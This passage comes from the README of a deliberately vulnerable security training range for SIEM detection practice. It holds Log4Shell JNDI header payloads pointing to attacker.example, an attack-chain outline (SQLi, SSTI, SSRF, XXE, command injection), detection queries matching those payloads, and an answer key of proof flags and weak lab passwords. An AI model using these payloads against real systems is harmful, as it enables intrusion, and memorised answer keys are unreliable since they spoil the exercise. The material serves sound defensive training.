curl -s -X POST $BASE/services/quote -H 'Content-Type: application/json' \
  -d '{"weight_kg":1200,"rate_per_kg":0.0001}' | jq
```

**Detection — UC-17**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=business_logic_abuse negative_total=true
| stats count sum(total) as net_total values(weight_kg) as weights by source_ip
```

Business logic abuse has no payload signature — no WAF will catch it. The
detection has to come from the application's own domain model. That is the
lesson: **some findings are only visible to instrumentation you write yourself.**

**Fix** Validate invariants server-side (weight is positive and within limits);
never trust a client-supplied rate — look it up by lane and contract.

---

### 22. Legacy audit shim evaluates lookup syntax — `jndi-audit` · 125 · medium

**Feature** Legacy tracking integration · **OWASP** A06 · **MITRE** T1190, T1203

`/status/diagnostics` lists `log4j-core 2.14.1` against "legacy audit shim".

```bash
curl -s -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' $BASE/api/v1/audit/event | jq
curl -s -A '${jndi:ldap://attacker.example/a}' $BASE/api/v1/audit/event | jq
```

**Recovered** The audit subsystem service token, disclosed by the expansion.

> **Simulated by design.** No JNDI resolution, LDAP connection or class loading
> happens. The point is to generate the *telemetry* a real Log4Shell attempt
> produces so you can prove your detection matches it, without shipping a working
> exploit primitive.

**Detection — UC-18**

```spl
index=vapt_lab sourcetype=helpag:owasp:json event_type=jndi_lookup_detected
| stats count values(tracking_agent) as payloads by source_ip user_agent
```

Hunt more broadly across any web sourcetype:

```spl
index=* (user_agent="*${jndi:*" OR user_agent="*${lower:*" OR _raw="*${jndi:*")
| stats count values(user_agent) as agents by index sourcetype src_ip
```

In production the stronger signal is egress: a JVM making an outbound LDAP/RMI
connection to an unknown host.

**Fix** Patch to Log4j 2.17.1+. Until then, never log unsanitised request
headers, and block outbound LDAP/RMI at the egress boundary.

---

## 7. The intended attack chain

The findings are not independent. Run them in this order and the target tells
one story — the story your SIEM should be able to reconstruct from events alone.

```
  RECON      robots.txt -> /internal/it-runbook.txt -> /backups/ -> /.env
                 |                    |                   |           |
                 |          three open tickets      account list   session key
                 |          naming findings 8,12,17                JWT key
                 |                                                 svc password
                 v                                                     |
  FOOTHOLD   legacy login SQLi ....... or ....... svc_edi brute force <-+
             mass assignment -> staff ... or ... forged session cookie
                 |
                 v
  STAFF      /admin -> DR master code
             /admin/diagnostics  -> command injection -> files on disk
             /admin/campaigns    -> SSTI              -> signing keys
             /admin/integrations -> SSRF              -> cloud credentials
                 |
                 v
  DATA       IDOR consignments, invoice traversal, EDI XXE,
             uploads store, financial report via unsigned token
```

Run the whole chain from one source address, then fire UC-21:

```spl
index=vapt_lab sourcetype=helpag:owasp:json
| `helpag_kill_chain_stage`
| search stage=*
| stats dc(stage) as stages values(stage) as observed values(event_type) as events
        min(_time) as first max(_time) as last by source_ip
| where stages>=3
```

A source touching three or more stages within an hour is an intrusion, not a
scan.

### The tuning exercise worth doing

Run the range twice and compare what your alerts produced:

1. **A vulnerability scanner** (Nikto, ZAP, Nuclei) — enormous volume, stages 1
   and 2 only, almost never reaches 3 or 4.
2. **A human following this playbook** — low volume, but clean progression
   through all four stages, ending in `artifact_disclosed` (UC-22).

If your alerting cannot separate those two, that is the finding. Volume-based
detections drown in the first case and miss the second.

---

## 8. Validation

```bash
# Docker
./tools/validate_range.sh http://127.0.0.1:5005

# Native
APP_ROOT="$PWD" METADATA_URL="http://127.0.0.1:8080" \
  PYTHON="$PWD/.venv/bin/python" ./tools/validate_range.sh http://127.0.0.1:5005

# Windows
.\tools\Validate-Range.ps1 -BaseUrl http://localhost:8080 -MetadataPort 8081
```

Expected: `== 22 passed, 0 failed ==`

| Variable | Default | Purpose |
|---|---|---|
| `APP_ROOT` | `/app` | Absolute path used by the XXE payload |
| `METADATA_URL` | `http://metadata:8080` | SSRF destination |
| `PYTHON` | `python3` | Interpreter for the session forge |
| `RANGE_CONSOLE_TOKEN` | `range-operator` | Operator console gate |
| `TEAM` | `validation-bot` | Team name to register |

Unit tests:

```bash
.venv/bin/python -m unittest discover -s tests -v      # 45 tests
python3 tools/check_playbook.py                        # playbook vs catalogue
```

The test suite asserts the realism properties directly: public pages disclose no
proof value, never mention range mechanics, never link to the console, and no
exploited endpoint returns a field called `flag`.

---

## 9. Operator tasks

### Before a live exercise

```bash
# Change the console token - the default is published in this repository
sed -i 's/^RANGE_CONSOLE_TOKEN=.*/RANGE_CONSOLE_TOKEN=<something else>/' .env
docker compose up -d
```

### Reset between sessions

```bash
docker compose down
rm -rf logs
git checkout uploads/          # restore the seeded applicant documents
docker compose up -d
```

Clears the scoreboard, enquiries, uploads and the event log. Proof values are
baked into the image and do not change.

### Watch progress

```bash
curl -s -H "X-Range-Token: $TOKEN" http://127.0.0.1:5005/range/api/scoreboard | jq
curl -s -H "X-Range-Token: $TOKEN" http://127.0.0.1:5005/range/api/progress | jq
tail -f logs/meridian-events.jsonl | jq -c '{t:.timestamp,ip:.source_ip,e:.event_type,s:.severity}'
```

Watch only the moments that matter:

```bash
tail -f logs/meridian-events.jsonl | jq -c 'select(.event_type=="artifact_disclosed")
  | {ip:.source_ip, finding:.finding_title, got:.proof_artifact}'
```

### Change the proof values

They live in [`labsite/catalog.py`](labsite/catalog.py). Edit a `flag` value,
then regenerate the on-disk artifacts and rebuild:

```bash
python3 tools/seed_fixtures.py
python3 tools/check_playbook.py     # tells you which values drifted from this file
docker compose up --build -d
```

### Add a finding

1. Append to `FINDINGS` in `labsite/catalog.py`.
2. Implement the business feature in `labsite/business.py`. Embed the proof value
   in a realistic artifact, call `note_disclosure("<id>")` when it is handed over,
   and `emit_event(...)` on both attempt and success. **Do not return a field
   called `flag`** — a test enforces this.
3. Add a detection stanza to `splunk/TA-helpag-vapt/default/savedsearches.conf`.
4. Add a walkthrough to section 6 of this file.
5. Add a case to `tools/validate_range.sh` and `tools/Validate-Range.ps1`.

The console, scoreboard, progress API and MITRE matrix all read from the
catalogue, so steps 1–3 are the only code changes required.

---

## Appendix A — Findings and proof values

| Finding | Artifact it comes from | Value |
|---|---|---|
| `recon-runbook` | IT runbook | `MERIDIAN{0ut_0f_h0urs_4cc3ss_c0d3_1n_runb00k}` |
| `misconfig-debug` | Status page configuration | `MERIDIAN{supp0rt_byp4ss_c0d3_1n_d14gn0st1cs}` |
| `misconfig-dotenv` | Deployment `.env` | `MERIDIAN{l3g4cy_m1gr4t10n_k3y_1n_d0t3nv}` |
| `misconfig-backups` | Nightly SQL export | `MERIDIAN{p4yr0ll_r3f_1n_n1ghtly_db_3xp0rt}` |
| `idor-shipment` | Another customer's consignment | `MERIDIAN{c0ns1gnm3nt_r3c0rd_cr0ss_t3n4nt}` |
| `access-massassign` | Operations dashboard | `MERIDIAN{d1sp4tch_4uth_c0d3_st4ff_0nly}` |
| `sqli-union` | `integration_credentials` table | `MERIDIAN{p4rtn3r_4p1_k3y_fr0m_1nt3gr4t10ns}` |
| `sqli-authbypass` | Operations console account | `MERIDIAN{tr34sury_r3c0nc1l14t10n_k3y}` |
| `xss-reflected` | Support agent session cookie | `MERIDIAN{4g3nt_s3ss10n_st0l3n_v14_s34rch}` |
| `xss-stored` | Operations manager session | `MERIDIAN{0ps_m4n4g3r_s3ss10n_fr0m_1nb0x}` |
| `traversal-invoice` | `instance/app-secrets.ini` | `MERIDIAN{4pp_s3cr3ts_r34d_by_tr4v3rs4l}` |
| `rce-cmdi` | `instance/keys/depot-transfer.key` | `MERIDIAN{d3p0t_t00l_g4v3_m3_4_sh3ll}` |
| `rce-ssti` | `instance/keys/campaign-signing.key` | `MERIDIAN{c4mp41gn_pr3v13w_r34ch3d_runt1m3}` |
| `xxe-edi` | `instance/edi/partner-manifest.key` | `MERIDIAN{3d1_1mp0rt_r34d_l0c4l_f1l3s}` |
| `upload-unrestricted` | HR onboarding pack in `/uploads/` | `MERIDIAN{hr_0nb04rd1ng_p4ck_fr0m_upl04ds}` |
| `jwt-none` | Quarterly financial report | `MERIDIAN{qu4rt3rly_f1n4nc14ls_uns1gn3d_t0k3n}` |
| `weak-session-secret` | Administration area | `MERIDIAN{d1s4st3r_r3c0v3ry_m4st3r_c0d3}` |
| `auth-bruteforce` | `svc_edi` account record | `MERIDIAN{3d1_tr4nsf3r_k3y_s3rv1c3_4cc0unt}` |
| `reset-token` | Finance contact's account | `MERIDIAN{b4nk1ng_4m3ndm3nt_r3f_t4k30v3r}` |
| `ssrf-metadata` | Instance role credentials | `MERIDIAN{1nst4nc3_r0l3_cr3ds_v14_pr3v13w}` |
| `logic-negative-quote` | Credit note | `MERIDIAN{cr3d1t_n0t3_1ssu3d_n3g4t1v3_qty}` |
| `jndi-audit` | Audit subsystem token | `MERIDIAN{4ud1t_sh1m_l00kup_s3rv1c3_t0k3n}` |

## Appendix B — Synthetic accounts

All fictional; they exist only in this lab's SQLite database.

| Username | Password | Type | Used by |
|---|---|---|---|
| `dokafor` | `Harbor2024!` | customer | Portal demo, reset-token discovery |
| `rmenon` | `Spring2025` | customer | Filler |
| `icalder` | `letmein123` | customer | Owns the high-value consignment |
| `svc_edi` | `autumn2024` | service | `auth-bruteforce` |
| `tbrandt` | `Dispatch!2025` | staff | Staff account |
| `avoss` | `Tr0ub4dour&3` | finance | `reset-token` |
| `ops_console` | `Meridian#Ops1` | operations | `sqli-authbypass` |

## Appendix C — Tooling

| Tool | Used for |
|---|---|
| `curl`, `jq` | Every finding; the baseline |
| `ffuf` / `gobuster` | Findings 3, 4, 5, 18 — content and identifier discovery |
| `sqlmap` | Finding 7 — and the loudest UC-06 trigger available |
| `flask-unsign` | Finding 17 — decode, crack and forge sessions |
| Burp Suite | Repeater and Intruder throughout; see [`BURP_SUITE_TEST_GUIDE.md`](BURP_SUITE_TEST_GUIDE.md) |
| Nikto / ZAP / Nuclei | Volume baseline for tuning (section 7) |
